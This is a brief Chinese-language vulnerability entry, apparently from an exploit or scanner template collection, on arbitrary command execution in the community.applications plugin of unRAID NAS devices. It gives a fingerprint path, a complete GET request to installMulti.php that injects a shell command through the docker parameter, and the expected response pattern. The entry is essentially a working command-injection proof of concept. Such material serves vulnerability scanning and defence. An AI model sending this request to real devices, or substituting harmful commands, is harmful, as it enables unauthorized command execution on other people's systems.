# NAS设备unraidcommunity.applications插件任意命令执行漏洞

NAS ｜ 命令执行 ｜ —
- **指纹**：`"/webGui/images/banner.png"`
- **请求**：`GET /plugins/community.applications/scripts/installMulti.php?docker=222echo dudesite >dudesite.txt HTTP/1.1`
- **响应特征**：200 222